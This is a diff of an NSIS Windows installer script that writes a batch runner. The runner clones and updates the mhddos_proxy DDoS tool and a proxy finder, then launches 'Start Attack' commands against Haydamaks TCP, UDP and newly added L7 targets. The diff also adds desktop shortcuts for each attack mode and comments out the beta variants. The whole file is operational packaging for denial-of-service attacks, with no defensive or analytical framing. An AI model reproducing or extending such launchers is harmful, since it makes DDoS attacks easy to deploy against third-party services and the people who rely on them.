@@ -120,8 +120,8 @@ Section ;RUNNER
 
   FileWrite $9 ":RUN_CLONE_MHDDOS_PROXY$\r$\n"
   FileWrite $9 "FOR %%A IN (%*) DO (IF '%%A'=='-clone_mhddos_proxy' goto CLONE_MHDDOS_PROXY)$\r$\n"
-  FileWrite $9 ":RUN_CLONE_MHDDOS_PROXY_BETA$\r$\n"
-  FileWrite $9 "FOR %%A IN (%*) DO (IF '%%A'=='-clone_mhddos_proxy_beta' goto CLONE_MHDDOS_PROXY_BETA)$\r$\n"
+  ;FileWrite $9 ":RUN_CLONE_MHDDOS_PROXY_BETA$\r$\n"
+  ;FileWrite $9 "FOR %%A IN (%*) DO (IF '%%A'=='-clone_mhddos_proxy_beta' goto CLONE_MHDDOS_PROXY_BETA)$\r$\n"
   
   FileWrite $9 ":run_clone_proxy_finder$\r$\n"
   FileWrite $9 "FOR %%A IN (%*) DO (IF '%%A'=='-clone_proxy_finder' goto clone_proxy_finder)$\r$\n"
@@ -132,10 +132,12 @@ Section ;RUNNER
   FileWrite $9 "FOR %%A IN (%*) DO (IF '%%A'=='-haydamaks_tcp' goto haydamaks_tcp)$\r$\n"
   FileWrite $9 ":run_haydamaks_udp$\r$\n"
   FileWrite $9 "FOR %%A IN (%*) DO (IF '%%A'=='-haydamaks_udp' goto haydamaks_udp)$\r$\n"
-  FileWrite $9 ":run_haydamaks_tcp_beta$\r$\n"
-  FileWrite $9 "FOR %%A IN (%*) DO (IF '%%A'=='-haydamaks_tcp_beta' goto haydamaks_tcp_beta)$\r$\n"
-  FileWrite $9 ":run_haydamaks_udp_beta$\r$\n"
-  FileWrite $9 "FOR %%A IN (%*) DO (IF '%%A'=='-haydamaks_udp_beta' goto haydamaks_udp_beta)$\r$\n"
+  FileWrite $9 ":run_haydamaks_l7$\r$\n"
+  FileWrite $9 "FOR %%A IN (%*) DO (IF '%%A'=='-haydamaks_l7' goto haydamaks_l7)$\r$\n"
+  ;FileWrite $9 ":run_haydamaks_tcp_beta$\r$\n"
+  ;FileWrite $9 "FOR %%A IN (%*) DO (IF '%%A'=='-haydamaks_tcp_beta' goto haydamaks_tcp_beta)$\r$\n"
+  ;FileWrite $9 ":run_haydamaks_udp_beta$\r$\n"
+  ;FileWrite $9 "FOR %%A IN (%*) DO (IF '%%A'=='-haydamaks_udp_beta' goto haydamaks_udp_beta)$\r$\n"
   
   FileWrite $9 ":MAIN_INFO$\r$\n"
   FileWrite $9 "ECHO.$\r$\n"
@@ -157,13 +159,13 @@ Section ;RUNNER
   FileWrite $9 "python -m pip install -r requirements.txt$\r$\n"
   FileWrite $9 "goto END$\r$\n"
   
-  FileWrite $9 ":CLONE_MHDDOS_PROXY_BETA$\r$\n"
-  FileWrite $9 "CD $INSTDIR$\r$\n"
-  FileWrite $9 "git clone -b feature-async ${MHDDOS_PROXY_SRC} ${MHDDOS_PROXY_BETA_DIR}$\r$\n"
-  FileWrite $9 "CD ${MHDDOS_PROXY_BETA_DIR}$\r$\n"
-  FileWrite $9 "git pull$\r$\n"
-  FileWrite $9 "python -m pip install -r requirements.txt$\r$\n"
-  FileWrite $9 "goto END$\r$\n"
+  ;FileWrite $9 ":CLONE_MHDDOS_PROXY_BETA$\r$\n"
+  ;FileWrite $9 "CD $INSTDIR$\r$\n"
+  ;FileWrite $9 "git clone -b feature-async ${MHDDOS_PROXY_SRC} ${MHDDOS_PROXY_BETA_DIR}$\r$\n"
+  ;FileWrite $9 "CD ${MHDDOS_PROXY_BETA_DIR}$\r$\n"
+  ;FileWrite $9 "git pull$\r$\n"
+  ;FileWrite $9 "python -m pip install -r requirements.txt$\r$\n"
+  ;FileWrite $9 "goto END$\r$\n"
   
   FileWrite $9 ":clone_proxy_finder$\r$\n"
   FileWrite $9 "CD $INSTDIR$\r$\n"
@@ -194,7 +196,7 @@ Section ;RUNNER
   FileWrite $9 "python -m pip install -r requirements.txt$\r$\n"
   FileWrite $9 "ECHO OK$\r$\n"
   FileWrite $9 "ECHO Start Attack Haydamaks TCP Target$\r$\n"
-  FileWrite $9 "python runner.py ${haydamaks_tcp_target} --debug$\r$\n"
+  FileWrite $9 "python runner.py ${haydamaks_tcp_target}$\r$\n"
   FileWrite $9 "goto END$\r$\n"
  
   FileWrite $9 ":haydamaks_udp$\r$\n"
@@ -206,32 +208,44 @@ Section ;RUNNER
   FileWrite $9 "python -m pip install -r requirements.txt$\r$\n"
   FileWrite $9 "ECHO OK$\r$\n"
   FileWrite $9 "ECHO Start Attack Haydamaks UDP Target$\r$\n"
-  FileWrite $9 "python runner.py ${haydamaks_udp_target} --debug$\r$\n"
+  FileWrite $9 "python runner.py ${haydamaks_udp_target}$\r$\n"
   FileWrite $9 "goto END$\r$\n"
   
-  FileWrite $9 ":haydamaks_tcp_beta$\r$\n"
-  FileWrite $9 "CD ${MHDDOS_PROXY_BETA_DIR}$\r$\n"
+  FileWrite $9 ":haydamaks_l7$\r$\n"
+  FileWrite $9 "CD ${MHDDOS_PROXY_DIR}$\r$\n"
   FileWrite $9 "ECHO Cheack Update mhddos_proxy$\r$\n"
   FileWrite $9 "git pull$\r$\n"
   FileWrite $9 "ECHO OK$\r$\n"
   FileWrite $9 "ECHO Cheack requirements$\r$\n"
   FileWrite $9 "python -m pip install -r requirements.txt$\r$\n"
   FileWrite $9 "ECHO OK$\r$\n"
-  FileWrite $9 "ECHO Start Attack Haydamaks TCP Target BETA$\r$\n"
-  FileWrite $9 "python runner.py ${haydamaks_tcp_target} --debug$\r$\n"
+  FileWrite $9 "ECHO Start Attack Haydamaks L7 Target$\r$\n"
+  FileWrite $9 "python runner.py ${haydamaks_l7_target}$\r$\n"
   FileWrite $9 "goto END$\r$\n"
   
-  FileWrite $9 ":haydamaks_udp_beta$\r$\n"
-  FileWrite $9 "CD ${MHDDOS_PROXY_BETA_DIR}$\r$\n"
-  FileWrite $9 "ECHO Cheack Update mhddos_proxy$\r$\n"
-  FileWrite $9 "git pull$\r$\n"
-  FileWrite $9 "ECHO OK$\r$\n"
-  FileWrite $9 "ECHO Cheack requirements$\r$\n"
-  FileWrite $9 "python -m pip install -r requirements.txt$\r$\n"
-  FileWrite $9 "ECHO OK$\r$\n"
-  FileWrite $9 "ECHO Start Attack Haydamaks UDP Target BETA$\r$\n"
-  FileWrite $9 "python runner.py ${haydamaks_udp_target} --debug$\r$\n"
-  FileWrite $9 "goto END$\r$\n"
+  ;FileWrite $9 ":haydamaks_tcp_beta$\r$\n"
+  ;FileWrite $9 "CD ${MHDDOS_PROXY_BETA_DIR}$\r$\n"
+  ;FileWrite $9 "ECHO Cheack Update mhddos_proxy$\r$\n"
+  ;FileWrite $9 "git pull$\r$\n"
+  ;FileWrite $9 "ECHO OK$\r$\n"
+  ;FileWrite $9 "ECHO Cheack requirements$\r$\n"
+  ;FileWrite $9 "python -m pip install -r requirements.txt$\r$\n"
+  ;FileWrite $9 "ECHO OK$\r$\n"
+  ;FileWrite $9 "ECHO Start Attack Haydamaks TCP Target BETA$\r$\n"
+  ;FileWrite $9 "python runner.py ${haydamaks_tcp_target} --debug$\r$\n"
+  ;FileWrite $9 "goto END$\r$\n"
+  
+  ;FileWrite $9 ":haydamaks_udp_beta$\r$\n"
+  ;FileWrite $9 "CD ${MHDDOS_PROXY_BETA_DIR}$\r$\n"
+  ;FileWrite $9 "ECHO Cheack Update mhddos_proxy$\r$\n"
+  ;FileWrite $9 "git pull$\r$\n"
+  ;FileWrite $9 "ECHO OK$\r$\n"
+  ;FileWrite $9 "ECHO Cheack requirements$\r$\n"
+  ;FileWrite $9 "python -m pip install -r requirements.txt$\r$\n"
+  ;FileWrite $9 "ECHO OK$\r$\n"
+  ;FileWrite $9 "ECHO Start Attack Haydamaks UDP Target BETA$\r$\n"
+  ;FileWrite $9 "python runner.py ${haydamaks_udp_target} --debug$\r$\n"
+  ;FileWrite $9 "goto END$\r$\n"
 
   FileWrite $9 ":END$\r$\n"
   FileWrite $9 "EXIT$\r$\n"
@@ -246,13 +260,13 @@ Section	"mhddos_proxy";INSTALL MHDDOS_PROXY
 
 SectionEnd
 
-Section	"mhddos_proxy_beta (feature-async)";INSTALL MHDDOS_PROXY_BETA
-  SectionIn RO
-  SetOutPath $INSTDIR
- 
-  nsExec::Exec 'cmd /c "$INSTDIR\runner.bat -clone_mhddos_proxy_beta"'
-  
-SectionEnd
+;Section	"mhddos_proxy_beta (feature-async)";INSTALL MHDDOS_PROXY_BETA
+;  SectionIn RO
+;  SetOutPath $INSTDIR
+; 
+;  nsExec::Exec 'cmd /c "$INSTDIR\runner.bat -clone_mhddos_proxy_beta"'
+;  
+;SectionEnd
 
 ;Proxy Finder
 Section	/o	$(inst_pf_req)
@@ -276,20 +290,21 @@ Section	$(inst_haydamaks_req)
   
   CreateShortCut "$DESKTOP\TCP $(inst_haydamaks_req).lnk" "$INSTDIR\runner.bat" "-haydamaks_tcp" "$INSTDIR\haydamaks.ico" 0
   CreateShortCut "$DESKTOP\UDP $(inst_haydamaks_req).lnk" "$INSTDIR\runner.bat" "-haydamaks_udp" "$INSTDIR\haydamaks.ico" 0
+  CreateShortCut "$DESKTOP\L7 $(inst_haydamaks_req).lnk" "$INSTDIR\runner.bat" "-haydamaks_l7" "$INSTDIR\haydamaks.ico" 0
 
 SectionEnd
 
 ;Haydamaks BETA
-Section	$(inst_haydamaks_beta_req)
-
-  SetOutPath $INSTDIR
-  
-  File "resources\haydamaks_beta.ico"
-  
-  CreateShortCut "$DESKTOP\TCP $(inst_haydamaks_beta_req).lnk" "$INSTDIR\runner.bat" "-haydamaks_tcp_beta" "$INSTDIR\haydamaks_beta.ico" 0
-  CreateShortCut "$DESKTOP\UDP $(inst_haydamaks_beta_req).lnk" "$INSTDIR\runner.bat" "-haydamaks_udp_beta" "$INSTDIR\haydamaks_beta.ico" 0
-
-SectionEnd
+;Section	$(inst_haydamaks_beta_req)
+;
+;  SetOutPath $INSTDIR
+;  
+;  File "resources\haydamaks_beta.ico"
+;  
+;  CreateShortCut "$DESKTOP\TCP $(inst_haydamaks_beta_req).lnk" "$INSTDIR\runner.bat" "-haydamaks_tcp_beta" "$INSTDIR\haydamaks_beta.ico" 0
+;  CreateShortCut "$DESKTOP\UDP $(inst_haydamaks_beta_req).lnk" "$INSTDIR\runner.bat" "-haydamaks_udp_beta" "$INSTDIR\haydamaks_beta.ico" 0
+;
+;SectionEnd
 
 
 Function .onInit
